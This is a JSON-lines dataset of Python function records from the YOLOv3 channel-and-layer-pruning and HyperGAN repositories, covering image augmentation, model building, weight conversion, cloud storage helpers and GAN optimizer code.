{"docstring": "# loads 1 image from dataset\n", "func_signal": "def load_image(self, index):\n", "code": "img = self.imgs[index]\nif img is None:\n    img_path = self.img_files[index]\n    img = cv2.imread(img_path)  # BGR\n    assert img is not None, 'Image Not Found ' + img_path\n    r = self.img_size / max(img.shape)  # size ratio\n    if self.augment and r < 1:  # if training (NOT testing), downsize to inference shape\n        h, w, _ = img.shape\n        img = cv2.resize(img, (int(w * r), int(h * r)), interpolation=cv2.INTER_LINEAR)  # _LINEAR fastest\n\n# Augment colorspace\nif self.augment:\n    augment_hsv(img, hgain=self.hyp['hsv_h'], sgain=self.hyp['hsv_s'], vgain=self.hyp['hsv_v'])\n\nreturn img", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Resize a rectangular image to a 32 pixel multiple rectangle\n# https://github.com/ultralytics/yolov3/issues/232\n", "func_signal": "def letterbox(img, new_shape=416, color=(128, 128, 128), mode='auto', interp=cv2.INTER_AREA):\n", "code": "shape = img.shape[:2]  # current shape [height, width]\n\nif isinstance(new_shape, int):\n    r = float(new_shape) / max(shape)  # ratio  = new / old\nelse:\n    r = max(new_shape) / max(shape)\nratio = r, r  # width, height ratios\nnew_unpad = (int(round(shape[1] * r)), int(round(shape[0] * r)))\n\n# Compute padding https://github.com/ultralytics/yolov3/issues/232\nif mode is 'auto':  # minimum rectangle\n    dw = np.mod(new_shape - new_unpad[0], 32) / 2  # width padding\n    dh = np.mod(new_shape - new_unpad[1], 32) / 2  # height padding\nelif mode is 'square':  # square\n    dw = (new_shape - new_unpad[0]) / 2  # width padding\n    dh = (new_shape - new_unpad[1]) / 2  # height padding\nelif mode is 'rect':  # square\n    dw = (new_shape[1] - new_unpad[0]) / 2  # width padding\n    dh = (new_shape[0] - new_unpad[1]) / 2  # height padding\nelif mode is 'scaleFill':\n    dw, dh = 0.0, 0.0\n    new_unpad = (new_shape, new_shape)\n    ratio = new_shape / shape[1], new_shape / shape[0]  # width, height ratios\n\nif shape[::-1] != new_unpad:  # resize\n    img = cv2.resize(img, new_unpad, interpolation=interp)  # INTER_AREA is better, INTER_LINEAR is faster\ntop, bottom = int(round(dh - 0.1)), int(round(dh + 0.1))\nleft, right = int(round(dw - 0.1)), int(round(dw + 0.1))\nimg = cv2.copyMakeBorder(img, top, bottom, left, right, cv2.BORDER_CONSTANT, value=color)  # add border\nreturn img, ratio, dw, dh", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# https://arxiv.org/abs/1708.04552\n# https://github.com/hysts/pytorch_cutout/blob/master/dataloader.py\n# https://towardsdatascience.com/when-conventional-wisdom-fails-revisiting-data-augmentation-for-self-driving-cars-4831998c5509\n", "func_signal": "def cutout(image, labels):\n", "code": "h, w = image.shape[:2]\n\ndef bbox_ioa(box1, box2, x1y1x2y2=True):\n    # Returns the intersection over box2 area given box1, box2. box1 is 4, box2 is nx4. boxes are x1y1x2y2\n    box2 = box2.transpose()\n\n    # Get the coordinates of bounding boxes\n    b1_x1, b1_y1, b1_x2, b1_y2 = box1[0], box1[1], box1[2], box1[3]\n    b2_x1, b2_y1, b2_x2, b2_y2 = box2[0], box2[1], box2[2], box2[3]\n\n    # Intersection area\n    inter_area = (np.minimum(b1_x2, b2_x2) - np.maximum(b1_x1, b2_x1)).clip(0) * \\\n                 (np.minimum(b1_y2, b2_y2) - np.maximum(b1_y1, b2_y1)).clip(0)\n\n    # box2 area\n    box2_area = (b2_x2 - b2_x1) * (b2_y2 - b2_y1) + 1e-16\n\n    # Intersection over box2 area\n    return inter_area / box2_area\n\n# create random masks\nscales = [0.5] * 1  # + [0.25] * 4 + [0.125] * 16 + [0.0625] * 64 + [0.03125] * 256  # image size fraction\nfor s in scales:\n    mask_h = random.randint(1, int(h * s))\n    mask_w = random.randint(1, int(w * s))\n\n    # box\n    xmin = max(0, random.randint(0, w) - mask_w // 2)\n    ymin = max(0, random.randint(0, h) - mask_h // 2)\n    xmax = min(w, xmin + mask_w)\n    ymax = min(h, ymin + mask_h)\n\n    # apply random color mask\n    mask_color = [random.randint(0, 255) for _ in range(3)]\n    image[ymin:ymax, xmin:xmax] = mask_color\n\n    # return unobscured labels\n    if len(labels) and s > 0.03:\n        box = np.array([xmin, ymin, xmax, ymax], dtype=np.float32)\n        ioa = bbox_ioa(box, labels[:, 1:5])  # intersection over area\n        labels = labels[ioa < 0.90]  # remove >90% obscured labels\n\nreturn labels", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# trains output bias layers for 1 epoch and creates new backbone\n", "func_signal": "def prebias():\n", "code": "if opt.prebias:\n    train()  # transfer-learn yolo biases for 1 epoch\n    create_backbone(last)  # saved results as backbone.pt\n    opt.weights = wdir + 'backbone.pt'  # assign backbone\n    opt.prebias = False  # disable prebias", "path": "yolov3-channel-and-layer-pruning/train.py", "commit_date": "2019-12-27 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# device = 'cpu' or '0' or '0,1,2,3'\n", "func_signal": "def select_device(device='', apex=False):\n", "code": "cpu_request = device.lower() == 'cpu'\nif device and not cpu_request:  # if device requested other than 'cpu'\n    os.environ['CUDA_VISIBLE_DEVICES'] = device  # set environment variable\n    assert torch.cuda.is_available(), 'CUDA unavailable, invalid device %s requested' % device  # check availablity\n\ncuda = False if cpu_request else torch.cuda.is_available()\nif cuda:\n    c = 1024 ** 2  # bytes to MB\n    ng = torch.cuda.device_count()\n    x = [torch.cuda.get_device_properties(i) for i in range(ng)]\n    cuda_str = 'Using CUDA ' + ('Apex ' if apex else '')  # apex for mixed precision https://github.com/NVIDIA/apex\n    for i in range(0, ng):\n        if i == 1:\n            cuda_str = ' ' * len(cuda_str)\n        print(\"%sdevice%g _CudaDeviceProperties(name='%s', total_memory=%dMB)\" %\n              (cuda_str, i, x[i].name, x[i].total_memory / c))\nelse:\n    print('Using CPU')\n\nprint('')  # skip a line\nreturn torch.device('cuda:0' if cuda else 'cpu')", "path": "yolov3-channel-and-layer-pruning/utils/torch_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Constructs module list of layer blocks from module configuration in module_defs\n\n", "func_signal": "def create_modules(module_defs, img_size, arc):\n", "code": "hyperparams = module_defs.pop(0)\noutput_filters = [int(hyperparams['channels'])]\nmodule_list = nn.ModuleList()\nrouts = []  # list of layers which rout to deeper layes\nyolo_index = -1\n\nfor i, mdef in enumerate(module_defs):\n    modules = nn.Sequential()\n\n    if mdef['type'] == 'convolutional':\n        bn = int(mdef['batch_normalize'])\n        filters = int(mdef['filters'])\n        kernel_size = int(mdef['size'])\n        pad = (kernel_size - 1) // 2 if int(mdef['pad']) else 0\n        modules.add_module('Conv2d', nn.Conv2d(in_channels=output_filters[-1],\n                                               out_channels=filters,\n                                               kernel_size=kernel_size,\n                                               stride=int(mdef['stride']),\n                                               padding=pad,\n                                               bias=not bn))\n        if bn:\n            modules.add_module('BatchNorm2d', nn.BatchNorm2d(filters, momentum=0.1))\n        if mdef['activation'] == 'leaky':  # TODO: activation study https://github.com/ultralytics/yolov3/issues/441\n            modules.add_module('activation', nn.LeakyReLU(0.1, inplace=True))\n            # modules.add_module('activation', nn.PReLU(num_parameters=1, init=0.10))\n            # modules.add_module('activation', Swish())\n        elif mdef['activation'] == 'mish':\n            modules.add_module('activation', Mish())\n\n    elif mdef['type'] == 'maxpool':\n        kernel_size = int(mdef['size'])\n        stride = int(mdef['stride'])\n        maxpool = nn.MaxPool2d(kernel_size=kernel_size, stride=stride, padding=int((kernel_size - 1) // 2))\n        if kernel_size == 2 and stride == 1:  # yolov3-tiny\n            modules.add_module('ZeroPad2d', nn.ZeroPad2d((0, 1, 0, 1)))\n            modules.add_module('MaxPool2d', maxpool)\n        else:\n            modules = maxpool\n\n    elif mdef['type'] == 'upsample':\n        modules = nn.Upsample(scale_factor=int(mdef['stride']), mode='nearest')\n\n    elif mdef['type'] == 'route':  # nn.Sequential() placeholder for 'route' layer\n        layers = [int(x) for x in mdef['layers'].split(',')]\n        filters = sum([output_filters[i + 1 if i > 0 else i] for i in layers])\n        if 'groups' in mdef:\n            filters = filters // 2\n        routs.extend([l if l > 0 else l + i for l in layers])\n        # if mdef[i+1]['type'] == 'reorg3d':\n        #     modules = nn.Upsample(scale_factor=1/float(mdef[i+1]['stride']), mode='nearest')  # reorg3d\n\n    elif mdef['type'] == 'shortcut':  # nn.Sequential() placeholder for 'shortcut' layer\n        filters = output_filters[int(mdef['from'])]\n        layer = int(mdef['from'])\n        routs.extend([i + layer if layer < 0 else layer])\n\n    elif mdef['type'] == 'reorg3d':  # yolov3-spp-pan-scale\n        # torch.Size([16, 128, 104, 104])\n        # torch.Size([16, 64, 208, 208]) <-- # stride 2 interpolate dimensions 2 and 3 to cat with prior layer\n        pass\n\n    elif mdef['type'] == 'yolo':\n        yolo_index += 1\n        mask = [int(x) for x in mdef['mask'].split(',')]  # anchor mask\n        modules = YOLOLayer(anchors=mdef['anchors'][mask],  # anchor list\n                            nc=int(mdef['classes']),  # number of classes\n                            img_size=img_size,  # (416, 416)\n                            yolo_index=yolo_index,  # 0, 1 or 2\n                            arc=arc)  # yolo architecture\n\n        # Initialize preceding Conv2d() bias (https://arxiv.org/pdf/1708.02002.pdf section 3.3)\n        try:\n            if arc == 'defaultpw' or arc == 'Fdefaultpw':  # default with positive weights\n                b = [-4, -3.6]  # obj, cls\n            elif arc == 'default':  # default no pw (40 cls, 80 obj)\n                b = [-5.5, -4.0]\n            elif arc == 'uBCE':  # unified BCE (80 classes)\n                b = [0, -8.5]\n            elif arc == 'uCE':  # unified CE (1 background + 80 classes)\n                b = [10, -0.1]\n            elif arc == 'Fdefault':  # Focal default no pw (28 cls, 21 obj, no pw)\n                b = [-2.1, -1.8]\n            elif arc == 'uFBCE' or arc == 'uFBCEpw':  # unified FocalBCE (5120 obj, 80 classes)\n                b = [0, -6.5]\n            elif arc == 'uFCE':  # unified FocalCE (64 cls, 1 background + 80 classes)\n                b = [7.7, -1.1]\n\n            bias = module_list[-1][0].bias.view(len(mask), -1)  # 255 to 3x85\n            bias[:, 4] += b[0] - bias[:, 4].mean()  # obj\n            bias[:, 5:] += b[1] - bias[:, 5:].mean()  # cls\n            # bias = torch.load('weights/yolov3-spp.bias.pt')[yolo_index]  # list of tensors [3x85, 3x85, 3x85]\n            module_list[-1][0].bias = torch.nn.Parameter(bias.view(-1))\n            # utils.print_model_biases(model)\n        except:\n            print('WARNING: smart bias initialization failure.')\n\n    else:\n        print('Warning: Unrecognized Layer Type: ' + mdef['type'])\n\n    # Register module list and number of output filters\n    module_list.append(modules)\n    output_filters.append(filters)\n\nreturn module_list, routs, hyperparams", "path": "yolov3-channel-and-layer-pruning/models.py", "commit_date": "2020-07-07 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Converts between PyTorch and Darknet format per extension (i.e. *.weights convert to *.pt and vice versa)\n# from models import *; convert('cfg/yolov3-spp.cfg', 'weights/yolov3-spp.weights')\n\n# Initialize model\n", "func_signal": "def convert(cfg='cfg/yolov3-spp.cfg', weights='weights/yolov3-spp.weights'):\n", "code": "model = Darknet(cfg)\n\n# Load weights and save\nif weights.endswith('.pt'):  # if PyTorch format\n    model.load_state_dict(torch.load(weights, map_location='cpu')['model'])\n    save_weights(model, path='converted.weights', cutoff=-1)\n    print(\"Success: converted '%s' to 'converted.weights'\" % weights)\n\nelif weights.endswith('.weights'):  # darknet format\n    _ = load_darknet_weights(model, weights)\n\n    chkpt = {'epoch': -1,\n             'best_fitness': None,\n             'training_results': None,\n             'model': model.state_dict(),\n             'optimizer': None}\n\n    torch.save(chkpt, 'converted.pt')\n    print(\"Success: converted '%s' to 'converted.pt'\" % weights)\n\nelse:\n    print('Error: extension not supported.')", "path": "yolov3-channel-and-layer-pruning/models.py", "commit_date": "2020-07-07 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Returns exif-corrected PIL size\n", "func_signal": "def exif_size(img):\n", "code": "s = img.size  # (width, height)\ntry:\n    rotation = dict(img._getexif().items())[orientation]\n    if rotation == 6:  # rotation 270\n        s = (s[1], s[0])\n    elif rotation == 8:  # rotation 90\n        s = (s[1], s[0])\nexcept:\n    pass\n\nreturn s", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Uploads a file to a bucket\n# https://cloud.google.com/storage/docs/uploading-objects#storage-upload-object-python\n\n", "func_signal": "def upload_blob(bucket_name, source_file_name, destination_blob_name):\n", "code": "storage_client = storage.Client()\nbucket = storage_client.get_bucket(bucket_name)\nblob = bucket.blob(destination_blob_name)\n\nblob.upload_from_filename(source_file_name)\n\nprint('File {} uploaded to {}.'.format(\n    source_file_name,\n    destination_blob_name))", "path": "yolov3-channel-and-layer-pruning/utils/google_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Converts a PyTorch model to Darket format (*.pt to *.weights)\n# Note: Does not work if model.fuse() is applied\n", "func_signal": "def save_weights(self, path='model.weights', cutoff=-1):\n", "code": "with open(path, 'wb') as f:\n    # Write Header https://github.com/AlexeyAB/darknet/issues/2914#issuecomment-496675346\n    self.version.tofile(f)  # (int32) version info: major, minor, revision\n    self.seen.tofile(f)  # (int64) number of images seen during training\n\n    # Iterate through layers\n    for i, (mdef, module) in enumerate(zip(self.module_defs[:cutoff], self.module_list[:cutoff])):\n        if mdef['type'] == 'convolutional':\n            conv_layer = module[0]\n            # If batch norm, load bn first\n            if mdef['batch_normalize']:\n                bn_layer = module[1]\n                bn_layer.bias.data.cpu().numpy().tofile(f)\n                bn_layer.weight.data.cpu().numpy().tofile(f)\n                bn_layer.running_mean.data.cpu().numpy().tofile(f)\n                bn_layer.running_var.data.cpu().numpy().tofile(f)\n            # Load conv bias\n            else:\n                conv_layer.bias.data.cpu().numpy().tofile(f)\n            # Load conv weights\n            conv_layer.weight.data.cpu().numpy().tofile(f)", "path": "yolov3-channel-and-layer-pruning/models.py", "commit_date": "2020-07-07 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Read next stream frame in a daemon thread\n", "func_signal": "def update(self, index, cap):\n", "code": "n = 0\nwhile cap.isOpened():\n    n += 1\n    # _, self.imgs[index] = cap.read()\n    cap.grab()\n    if n == 4:  # read every 4th frame\n        _, self.imgs[index] = cap.retrieve()\n        n = 0\n    time.sleep(0.01)  # wait time", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Create folder\n", "func_signal": "def create_folder(path='./new_folder'):\n", "code": "if os.path.exists(path):\n    shutil.rmtree(path)  # delete output folder\nos.makedirs(path)  # make new output folder", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# https://tehnokv.com/posts/fusing-batchnorm-and-conv/\n", "func_signal": "def fuse_conv_and_bn(conv, bn):\n", "code": "with torch.no_grad():\n    # init\n    fusedconv = torch.nn.Conv2d(conv.in_channels,\n                                conv.out_channels,\n                                kernel_size=conv.kernel_size,\n                                stride=conv.stride,\n                                padding=conv.padding,\n                                bias=True)\n\n    # prepare filters\n    w_conv = conv.weight.clone().view(conv.out_channels, -1)\n    w_bn = torch.diag(bn.weight.div(torch.sqrt(bn.eps + bn.running_var)))\n    fusedconv.weight.copy_(torch.mm(w_bn, w_conv).view(fusedconv.weight.size()))\n\n    # prepare spatial bias\n    if conv.bias is not None:\n        b_conv = conv.bias\n    else:\n        b_conv = torch.zeros(conv.weight.size(0))\n    b_bn = bn.bias - bn.weight.mul(bn.running_mean).div(torch.sqrt(bn.running_var + bn.eps))\n    fusedconv.bias.copy_(b_conv + b_bn)\n\n    return fusedconv", "path": "yolov3-channel-and-layer-pruning/utils/torch_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# loads images in a mosaic\n\n", "func_signal": "def load_mosaic(self, index):\n", "code": "labels4 = []\ns = self.img_size\nxc, yc = [int(random.uniform(s * 0.5, s * 1.5)) for _ in range(2)]  # mosaic center x, y\nimg4 = np.zeros((s * 2, s * 2, 3), dtype=np.uint8) + 128  # base image with 4 tiles\nindices = [index] + [random.randint(0, len(self.labels) - 1) for _ in range(3)]  # 3 additional image indices\nfor i, index in enumerate(indices):\n    # Load image\n    img = load_image(self, index)\n    h, w, _ = img.shape\n\n    # place img in img4\n    if i == 0:  # top left\n        x1a, y1a, x2a, y2a = max(xc - w, 0), max(yc - h, 0), xc, yc  # xmin, ymin, xmax, ymax (large image)\n        x1b, y1b, x2b, y2b = w - (x2a - x1a), h - (y2a - y1a), w, h  # xmin, ymin, xmax, ymax (small image)\n    elif i == 1:  # top right\n        x1a, y1a, x2a, y2a = xc, max(yc - h, 0), min(xc + w, s * 2), yc\n        x1b, y1b, x2b, y2b = 0, h - (y2a - y1a), min(w, x2a - x1a), h\n    elif i == 2:  # bottom left\n        x1a, y1a, x2a, y2a = max(xc - w, 0), yc, xc, min(s * 2, yc + h)\n        x1b, y1b, x2b, y2b = w - (x2a - x1a), 0, max(xc, w), min(y2a - y1a, h)\n    elif i == 3:  # bottom right\n        x1a, y1a, x2a, y2a = xc, yc, min(xc + w, s * 2), min(s * 2, yc + h)\n        x1b, y1b, x2b, y2b = 0, 0, min(w, x2a - x1a), min(y2a - y1a, h)\n\n    img4[y1a:y2a, x1a:x2a] = img[y1b:y2b, x1b:x2b]  # img4[ymin:ymax, xmin:xmax]\n    padw = x1a - x1b\n    padh = y1a - y1b\n\n    # Load labels\n    label_path = self.label_files[index]\n    if os.path.isfile(label_path):\n        x = self.labels[index]\n        if x is None:  # labels not preloaded\n            with open(label_path, 'r') as f:\n                x = np.array([x.split() for x in f.read().splitlines()], dtype=np.float32)\n\n        if x.size > 0:\n            # Normalized xywh to pixel xyxy format\n            labels = x.copy()\n            labels[:, 1] = w * (x[:, 1] - x[:, 3] / 2) + padw\n            labels[:, 2] = h * (x[:, 2] - x[:, 4] / 2) + padh\n            labels[:, 3] = w * (x[:, 1] + x[:, 3] / 2) + padw\n            labels[:, 4] = h * (x[:, 2] + x[:, 4] / 2) + padh\n        # else:\n            # labels = np.zeros((0,5), dtype=np.float32)\n\n        labels4.append(labels)\nlabels4 = np.concatenate(labels4, 0)\n\n# hyp = self.hyp\n# img4, labels4 = random_affine(img4, labels4,\n#                               degrees=hyp['degrees'],\n#                               translate=hyp['translate'],\n#                               scale=hyp['scale'],\n#                               shear=hyp['shear'])\n\n# Center crop\na = s // 2\nimg4 = img4[a:a + s, a:a + s]\nlabels4[:, 1:] -= a\n\nreturn img4, labels4", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Uploads a blob from a bucket\n", "func_signal": "def download_blob(bucket_name, source_blob_name, destination_file_name):\n", "code": "storage_client = storage.Client()\nbucket = storage_client.get_bucket(bucket_name)\nblob = bucket.blob(source_blob_name)\n\nblob.download_to_filename(destination_file_name)\n\nprint('Blob {} downloaded to {}.'.format(\n    source_blob_name,\n    destination_file_name))", "path": "yolov3-channel-and-layer-pruning/utils/google_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "\"\"\"\u8c03\u6574\u5b66\u4e60\u7387\u8fdb\u884cwarm up\u548c\u5b66\u4e60\u7387\u8870\u51cf\n\"\"\"\n", "func_signal": "def adjust_learning_rate(optimizer, gamma, epoch, iteration, epoch_size):\n", "code": "step_index = 0\nif epoch < 6:\n    # \u5bf9\u5f00\u59cb\u76846\u4e2aepoch\u8fdb\u884cwarm up\n    lr = 1e-6 + (hyp['lr0'] - 1e-6) * iteration / (epoch_size * 2)\nelse:\n    if epoch > opt.epochs * 0.7:\n        # \u5728\u8fdb\u884c\u603bepochs\u768470%\u65f6\uff0c\u8fdb\u884c\u4ee5gamma\u7684\u5b66\u4e60\u7387\u8870\u51cf\n        step_index = 1\n    if epoch > opt.epochs * 0.9:\n        # \u5728\u8fdb\u884c\u603bepochs\u768490%\u65f6\uff0c\u8fdb\u884c\u4ee5gamma^2\u7684\u5b66\u4e60\u7387\u8870\u51cf\n        step_index = 2\n\n    lr = hyp['lr0'] * (gamma ** (step_index))\nfor param_group in optimizer.param_groups:\n    param_group['lr'] = lr\nreturn lr", "path": "yolov3-channel-and-layer-pruning/train.py", "commit_date": "2019-12-27 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "\"\"\" Attempt to directly compute hessian and apply equation (6) \"\"\"\n", "func_signal": "def finite_differences(self, grads_and_vars, global_step, name, d_vars, g_vars, d_grads, g_grads):\n", "code": "d_grads = []\ng_grads = []\nd_vars = []\ng_vars = []\nalpha = 0.5\nif self.config.alpha is not None:\n    alpha = self.gan.configurable_param(self.config.alpha)\nbeta = 0.5\nif self.config.beta is not None:\n    beta = self.gan.configurable_param(self.config.beta)\n\nfor grad,var in grads_and_vars:\n    if var in self.gan.d_vars():\n        d_vars += [var]\n        d_grads += [grad]\n    elif var in self.gan.g_vars():\n        g_vars += [var]\n        g_grads += [grad]\n    else:\n        raise(\"Couldn't find var in g_vars or d_vars\")\norig_grads = d_grads+g_grads\nall_vars = d_vars + g_vars\n\ndef curl():\n    grads = tf.gradients(self.gan.trainer.d_loss, d_vars) + tf.gradients(self.gan.trainer.g_loss, g_vars)\n    op3 = tf.group(*[tf.assign_sub(v, self._lr_t*grad) for grad,v in zip(grads, all_vars)])\n    with tf.get_default_graph().control_dependencies([op3]):\n        def curlcombine(g1,g2):\n            stepsize = self._lr_t\n            return g1-(g2-g1)/stepsize\n        new_grads = tf.gradients(self.gan.trainer.d_loss, d_vars) + tf.gradients(self.gan.trainer.g_loss, g_vars)\n        g3s = [curlcombine(g1,g2) for g1,g2 in zip(grads,new_grads)]\n        return g3s\n \n#gamma12\nif self.config.method == 'curl':\n    all_grads = curl()\n    d_grads = all_grads[:len(d_vars)]\n    g_grads = all_grads[len(d_vars):]\n\nall_grads = d_grads + g_grads\n\nwith ops.init_scope():\n    [self._zeros_slot(v, \"orig\", self._name) for _,v in grads_and_vars]\n\nv1 = [self.get_slot(v, \"orig\") for v in all_vars]\n\nrestored_vars = all_vars\ntmp_vars = v1\n\ne1 = 0.0001\ne2 = 0.0001\n\n#gamma12\nsave = tf.group(*[tf.assign(w, v) for w,v in zip(tmp_vars.copy(), restored_vars.copy())]) # store variables\n\nwith tf.get_default_graph().control_dependencies([save]):\n    #opboth = self.optimizer.apply_gradients(grads_and_vars, global_step=global_step, name=name)\n    #opdp = self.optimizer.apply_gradients(grads_and_vars[:len(d_vars)], global_step=global_step, name=name)\n    #opgp = self.optimizer.apply_gradients(grads_and_vars[len(d_vars):], global_step=global_step, name=name)\n    restore = tf.group(*[tf.assign(w, v) for w,v in zip(restored_vars.copy(), tmp_vars.copy())]) # store variables\n    opboth = [tf.assign_sub(w, self._lr_t * v) for w,v in zip(all_vars.copy(), all_grads.copy())] # store variables\n    with tf.get_default_graph().control_dependencies([tf.group(*opboth)]):\n        if self.config.method == \"curl\":\n            gboth = curl()\n        else:\n            gboth = tf.gradients(self.loss[0], d_vars) + tf.gradients(self.loss[1], g_vars)\n        with tf.get_default_graph().control_dependencies([restore]):\n            opd = opboth[:len(d_vars)]\n            with tf.get_default_graph().control_dependencies([tf.group(*opd)]):\n                if self.config.method == \"curl\":\n                    new_d_grads = curl()\n                else:\n                    new_d_grads = tf.gradients(self.loss[0], d_vars) + tf.gradients(self.loss[1], g_vars)\n                with tf.get_default_graph().control_dependencies([restore]):\n                    opg = opboth[len(d_vars):]\n                    with tf.get_default_graph().control_dependencies([tf.group(*opg)]):\n                        if self.config.method == \"curl\":\n                            new_g_grads = curl()\n                        else:\n                            new_g_grads = tf.gradients(self.loss[0], d_vars) + tf.gradients(self.loss[1], g_vars)\n                        with tf.get_default_graph().control_dependencies([restore]):\n                            new_grads = []\n                            for _gboth, _gd, _gg, _g, _orig_g in zip(gboth,new_d_grads,new_g_grads,(d_grads+g_grads), orig_grads):\n                                a = (_gg - _g) / self._lr_t # d2f/dx2i\n                                b = (_gboth - _gg) / (2*self._lr_t)+(_gd-_g)/(2*self._lr_t) # d2f/dx1dx2\n                                c = (_gboth - _gd) / (2*self._lr_t)+(_gg-_g)/(2*self._lr_t) # d2f/dx1dx2\n                                c = -c\n                                d = -(_gd - _g) / self._lr_t # d2f/dx2j\n                                if self.config.form == 5:\n                                    a = (_gg - _g) / self._lr_t # d2f/dx2i\n                                    b = (_gboth - _gg) / (2*self._lr_t)+(_gd-_g)/(2*self._lr_t) # d2f/dx1dx2\n                                    c = (_gboth - _gd) / (2*self._lr_t)+(_gg-_g)/(2*self._lr_t) # d2f/dx1dx2\n                                    d = (_gd - _g) / self._lr_t # d2f/dx2j\n                                J = np.array([[a, b], [c,d]])\n                                Jt = np.transpose(J)\n\n                                det = a*d-b*c+1e-8\n                                #h_1 = 1.0/det * (b+d-a-c)\n                                h_1_a = d/det\n                                h_1_b = -b/det\n                                h_1_c = -c/det\n                                h_1_d = a/det\n                                Jinv = np.array([[h_1_a,h_1_b],[h_1_c,h_1_d]])\n                                _j = Jt[0][0]*Jinv[0][0]*_g+Jt[1][0]*Jinv[1][0]*_g+Jt[0][1]*Jinv[0][1]*_g+Jt[1][1]*Jinv[1][1]*_g\n\n                                new_grads.append( alpha*_orig_g + beta*_j )\n\n                            new_grads_and_vars = list(zip(new_grads, all_vars)).copy()\n                            return self.optimizer.apply_gradients(new_grads_and_vars, global_step=global_step, name=name)", "path": "HyperGAN/hypergan/optimizers/needs_pytorch/local_nash_optimizer.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "\"\"\" Samples to a file.  Useful for visualizing the learning process.\n\nIf allow_save is False then saves will not be created.\n\nUse with:\n\n     ffmpeg -i samples/grid-%06d.png -vcodec libx264 -crf 22 -threads 0 grid1-7.mp4\n\nto create a video of the learning process.\n\"\"\"\n", "func_signal": "def sample(self, sampler, sample_path, save_samples=True):\n", "code": "os.makedirs(os.path.expanduser(sample_path), exist_ok=True)\nsample_file=\"%s/%06d.png\" % (sample_path, self.samples)\nsample_list = sampler.sample(sample_file, save_samples)\nself.samples += 1\n\nreturn sample_list", "path": "HyperGAN/hypergan/trainable_gan.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "# open path as file to avoid ResourceWarning (https://github.com/python-pillow/Pillow/issues/835)\n", "func_signal": "def rgba_loader(self, path):\n", "code": "with open(path, 'rb') as f:\n    img = Image.open(f)\n    return img.convert('RGBA')", "path": "HyperGAN/hypergan/inputs/unsupervised_image_folder.py", "commit_date": "2020-06-12 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
{"docstring": "#print(\"VS\", len(vs), \"XS\", len(xs), \"YS\", len(ys))\n#return _hessian_vector_product(ys, xs, vs)\n#result = tf.gradients(ys, xs)\n#for r,v in zip(result, vs):\n#    print(\"R\", r)\n#    print(\"V\", v)\n", "func_signal": "def hvpvec(self, ys, xs, vs):\n", "code": "result = self.fwd_gradients(ys, xs, stop_gradients=xs)\n#print(\"R\", len(result))\n#print(\"V\", len(vs))\nresult = [ r * v for r, v in zip(result, vs) ]\nreturn result", "path": "HyperGAN/hypergan/optimizers/needs_pytorch/competitive_optimizer.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "HyperGAN/HyperGAN", "stars": 1188, "license": "mit", "language": "python", "size": 39062}
